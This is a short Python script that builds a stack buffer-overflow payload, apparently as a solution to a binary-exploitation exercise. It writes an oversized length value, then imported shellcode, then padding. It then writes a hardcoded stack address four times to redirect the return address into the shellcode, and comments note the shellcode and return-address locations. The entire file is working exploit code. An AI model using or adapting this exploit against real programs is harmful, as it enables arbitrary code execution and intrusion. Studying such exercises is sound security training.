#!/usr/bin/env python3

import sys
import struct

from shellcode import shellcode

input = 0xFFFFFFFFFFFFFFFF.to_bytes(8, "little")
sys.stdout.buffer.write(input)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'A'*10)
sys.stdout.buffer.write(0x7ffffff6ade0.to_bytes(8, "little"))
sys.stdout.buffer.write(0x7ffffff6ade0.to_bytes(8, "little"))
sys.stdout.buffer.write(0x7ffffff6ade0.to_bytes(8, "little"))
sys.stdout.buffer.write(0x7ffffff6ade0.to_bytes(8, "little"))


# start of shellcode: 0x7ffffff6addc
# return address: 0x7ffffff6ae18